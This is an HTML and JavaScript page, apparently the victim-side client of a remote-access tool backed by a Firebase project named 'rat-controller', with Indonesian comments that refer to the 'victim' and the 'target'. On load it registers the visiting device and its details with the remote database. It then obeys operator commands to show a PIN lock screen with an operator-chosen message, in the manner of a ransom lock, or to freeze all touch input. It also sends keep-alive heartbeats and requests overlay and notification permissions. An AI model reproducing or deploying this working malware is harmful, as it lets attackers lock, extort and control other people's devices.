<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            height: 100vh;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }
        
        /* ========== LOCK SCREEN ========== */
        #lockScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            z-index: 999999999;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        #lockScreen.active {
            display: flex;
        }
        #lockScreen .lock-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        #lockScreen .message {
            color: #ff4444;
            font-size: 18px;
            text-align: center;
            margin-bottom: 25px;
            padding: 0 20px;
            white-space: pre-wrap;
        }
        #lockScreen .pin-display {
            display: flex;
            gap: 15px;
            margin-bottom: 25px;
        }
        #lockScreen .pin-dot {
            width: 50px;
            height: 55px;
            background: #1a1a1a;
            border: 2px solid #444;
            border-radius: 10px;
            text-align: center;
            font-size: 28px;
            color: #fff;
            line-height: 50px;
        }
        #lockScreen .pin-dot.filled {
            border-color: #00ff41;
        }
        #lockScreen .numpad {
            display: grid;
            grid-template-columns: repeat(3, 80px);
            gap: 12px;
            margin-top: 10px;
        }
        #lockScreen .numpad button {
            width: 80px;
            height: 80px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 50%;
            color: #fff;
            font-size: 28px;
            cursor: pointer;
            transition: 0.2s;
        }
        #lockScreen .numpad button:active {
            background: #333;
            transform: scale(0.95);
        }
        #lockScreen .numpad button.clear {
            background: #331111;
            color: #ff4444;
            font-size: 16px;
        }
        #lockScreen .error-msg {
            color: #ff4444;
            font-size: 14px;
            margin-top: 15px;
            min-height: 20px;
        }

        /* ========== TOUCH BLOCK / FREEZE ========== */
        /* GAK ADA LAYAR HITAM, CUMA FREEZE SENTUHAN */
        #touchFreezeOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: transparent;
            z-index: 999999998;
            display: none;
            pointer-events: all;
            cursor: not-allowed;
        }
        #touchFreezeOverlay.active {
            display: block;
        }
        
        /* TIMER KECIL DI SUDUT KANAN ATAS (biar korban tau masih freeze) */
        #freezeTimer {
            position: fixed;
            top: 50px;
            right: 15px;
            background: rgba(255,170,0,0.9);
            color: #000;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 16px;
            font-weight: bold;
            z-index: 999999999;
            display: none;
            font-family: Arial, sans-serif;
            box-shadow: 0 0 20px rgba(255,170,0,0.5);
        }
        #freezeTimer.active {
            display: block;
            animation: pulse 0.5s infinite alternate;
        }
        @keyframes pulse {
            0% { opacity: 0.8; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.05); }
        }

        /* ========== LOADING & STATUS ========== */
        #loading {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-size: 14px;
            color: #666;
        }
        #statusBar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #111;
            padding: 5px 10px;
            font-size: 10px;
            color: #666;
            text-align: center;
            z-index: 999;
            border-bottom: 1px solid #222;
        }

        @media (max-width: 480px) {
            #lockScreen .numpad { grid-template-columns: repeat(3, 65px); gap: 8px; }
            #lockScreen .numpad button { width: 65px; height: 65px; font-size: 22px; }
            #lockScreen .pin-dot { width: 40px; height: 45px; font-size: 22px; line-height: 40px; }
            #freezeTimer { font-size: 13px; padding: 5px 12px; top: 45px; right: 10px; }
        }
    </style>
</head>
<body>
    <div id="statusBar">🟢 System Online</div>
    <div id="loading">⏳ Menghubungkan...</div>

    <!-- FREEZE TIMER (KECIL DI SUDUT) -->
    <div id="freezeTimer">✋ FREEZE: <span id="freezeCount">10</span>s</div>

    <!-- FREEZE OVERLAY (TRANSPARAN, BLOKIR SENTUHAN) -->
    <div id="touchFreezeOverlay"></div>

    <!-- LOCK SCREEN -->
    <div id="lockScreen">
        <div class="lock-icon">🔒</div>
        <div class="message" id="lockMessage">⚠️ DEVICE LOCKED</div>
        <div class="pin-display" id="pinDisplay">
            <div class="pin-dot" id="dot1"></div>
            <div class="pin-dot" id="dot2"></div>
            <div class="pin-dot" id="dot3"></div>
            <div class="pin-dot" id="dot4"></div>
        </div>
        <div class="numpad">
            <button onclick="pressPin('1')">1</button>
            <button onclick="pressPin('2')">2</button>
            <button onclick="pressPin('3')">3</button>
            <button onclick="pressPin('4')">4</button>
            <button onclick="pressPin('5')">5</button>
            <button onclick="pressPin('6')">6</button>
            <button onclick="pressPin('7')">7</button>
            <button onclick="pressPin('8')">8</button>
            <button onclick="pressPin('9')">9</button>
            <button onclick="clearPin()" class="clear">✕</button>
            <button onclick="pressPin('0')">0</button>
            <button onclick="submitPin()" style="background:#00ff41;color:#000;">✔</button>
        </div>
        <div class="error-msg" id="errorMsg"></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script>
        // ============================================================
        // 🔥 DATA FIREBASE SAMA
        // ============================================================
        const firebaseConfig = {
            apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
            authDomain: "rat-controller-5b29c.firebaseapp.com",
            databaseURL: "https://rat-controller-5b29c-default-rtdb.azurewebsites.net",
            projectId: "rat-controller-5b29c",
            storageBucket: "storage.googleapis.com",
            messagingSenderId: "928595828959",
            appId: "1:928595828959:web:e4715e3095f7456d5896a",
            measurementId: "G-821ZZ77TPS"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let deviceId = '';
        let currentPin = '';
        let correctPin = '';
        let isLocked = false;
        let freezeInterval = null;
        let freezeRemaining = 0;

        // ===================== GENERATE DEVICE ID =====================
        function generateDeviceId() {
            return 'dev_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2,6);
        }

        function getDeviceName() {
            try {
                if (window.navigator && window.navigator.userAgent) {
                    const ua = window.navigator.userAgent;
                    if (ua.includes('Android')) {
                        const match = ua.match(/Android\s([\d.]+)/);
                        return `Android ${match ? match[1] : 'Device'}`;
                    }
                    if (ua.includes('iPhone') || ua.includes('iPad')) {
                        return 'iOS Device';
                    }
                    return 'Unknown Device';
                }
            } catch(e) {}
            return 'Mobile Device';
        }

        // ===================== REGISTER TARGET =====================
        function registerTarget() {
            deviceId = generateDeviceId();
            const deviceName = getDeviceName();
            
            db.ref(`targets/${deviceId}`).set({
                deviceName: deviceName,
                online: true,
                locked: false,
                pin: null,
                message: null,
                touchBlocked: false,
                touchDuration: null,
                touchBlockTime: null,
                lastSeen: Date.now()
            }).then(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('statusBar').textContent = '🟢 Target Online | ID: ' + deviceId.slice(0,8);
                startListening();
            }).catch(err => {
                document.getElementById('loading').textContent = '❌ Gagal konek: ' + err.message;
                setTimeout(registerTarget, 5000);
            });
        }

        // ===================== LISTEN PERINTAH =====================
        function startListening() {
            const ref = db.ref(`targets/${deviceId}`);
            ref.on('value', (snapshot) => {
                const data = snapshot.val();
                if (!data) return;

                ref.update({ lastSeen: Date.now() });

                // CEK FREEZE (TOUCH BLOCK)
                if (data.touchBlocked === true && data.touchDuration) {
                    startFreeze(data.touchDuration);
                } else if (data.touchBlocked === false) {
                    stopFreeze();
                }

                // CEK LOCK SCREEN
                if (data.locked === true && data.pin) {
                    correctPin = data.pin;
                    isLocked = true;
                    showLockScreen(data.message || '⚠️ DEVICE LOCKED');
                } else if (data.locked === false) {
                    isLocked = false;
                    hideLockScreen();
                }
            });
        }

        // ===================== LOCK SCREEN =====================
        function showLockScreen(message) {
            document.getElementById('lockMessage').textContent = message;
            document.getElementById('lockScreen').classList.add('active');
            document.getElementById('errorMsg').textContent = '';
            currentPin = '';
            updateDots();
            requestOverlayPermission();
        }

        function hideLockScreen() {
            document.getElementById('lockScreen').classList.remove('active');
            currentPin = '';
            updateDots();
        }

        // ===================== FREEZE / TOUCH BLOCK =====================
        function startFreeze(duration) {
            // Tampilkan overlay transparan (blokir semua sentuhan)
            document.getElementById('touchFreezeOverlay').classList.add('active');
            document.getElementById('freezeTimer').classList.add('active');
            
            freezeRemaining = duration;
            document.getElementById('freezeCount').textContent = freezeRemaining;
            
            // Blokir semua interaksi di body
            document.body.style.pointerEvents = 'none';
            document.getElementById('touchFreezeOverlay').style.pointerEvents = 'all';
            
            if (freezeInterval) {
                clearInterval(freezeInterval);
            }
            
            freezeInterval = setInterval(() => {
                freezeRemaining--;
                document.getElementById('freezeCount').textContent = freezeRemaining;
                
                if (freezeRemaining <= 0) {
                    clearInterval(freezeInterval);
                    freezeInterval = null;
                    // Auto-unfreeze via Firebase
                    db.ref(`targets/${deviceId}`).update({
                        touchBlocked: false,
                        touchDuration: null,
                        touchBlockTime: null
                    }).catch(() => {});
                }
            }, 1000);
        }

        function stopFreeze() {
            document.getElementById('touchFreezeOverlay').classList.remove('active');
            document.getElementById('freezeTimer').classList.remove('active');
            document.body.style.pointerEvents = 'auto';
            
            if (freezeInterval) {
                clearInterval(freezeInterval);
                freezeInterval = null;
            }
        }

        // ===================== REQUEST OVERLAY =====================
        function requestOverlayPermission() {
            try {
                if (window.Android && window.Android.requestOverlay) {
                    window.Android.requestOverlay();
                }
            } catch(e) {}
        }

        // ===================== PIN FUNCTIONS =====================
        function pressPin(num) {
            if (currentPin.length < 4) {
                currentPin += num;
                updateDots();
            }
        }

        function clearPin() {
            currentPin = currentPin.slice(0, -1);
            updateDots();
            document.getElementById('errorMsg').textContent = '';
        }

        function submitPin() {
            if (currentPin.length !== 4) {
                document.getElementById('errorMsg').textContent = '⚠️ Masukkan 4 digit PIN';
                return;
            }

            if (currentPin === correctPin) {
                document.getElementById('errorMsg').textContent = '✅ PIN BENAR! UNLOCKING...';
                setTimeout(() => {
                    db.ref(`targets/${deviceId}`).update({
                        locked: false,
                        pin: null,
                        message: null
                    }).then(() => {
                        hideLockScreen();
                    });
                }, 300);
            } else {
                document.getElementById('errorMsg').textContent = '❌ PIN SALAH! Coba lagi';
                currentPin = '';
                updateDots();
                try {
                    if (window.navigator && window.navigator.vibrate) {
                        window.navigator.vibrate(200);
                    }
                } catch(e) {}
            }
        }

        function updateDots() {
            const dots = ['dot1', 'dot2', 'dot3', 'dot4'];
            dots.forEach((id, i) => {
                const el = document.getElementById(id);
                if (i < currentPin.length) {
                    el.textContent = '●';
                    el.className = 'pin-dot filled';
                } else {
                    el.textContent = '';
                    el.className = 'pin-dot';
                }
            });
        }

        // ===================== KEYBOARD =====================
        document.addEventListener('keydown', (e) => {
            if (e.key >= '0' && e.key <= '9') {
                pressPin(e.key);
            } else if (e.key === 'Enter') {
                submitPin();
            } else if (e.key === 'Backspace') {
                clearPin();
            }
        });

        // ===================== KEEP ALIVE =====================
        setInterval(() => {
            if (deviceId) {
                db.ref(`targets/${deviceId}`).update({
                    lastSeen: Date.now(),
                    online: true
                }).catch(() => {});
            }
        }, 10000);

        // ===================== START =====================
        document.addEventListener('DOMContentLoaded', () => {
            if (Notification && Notification.permission !== 'granted') {
                Notification.requestPermission();
            }
            registerTarget();
        });
    </script>
</body>
</html>
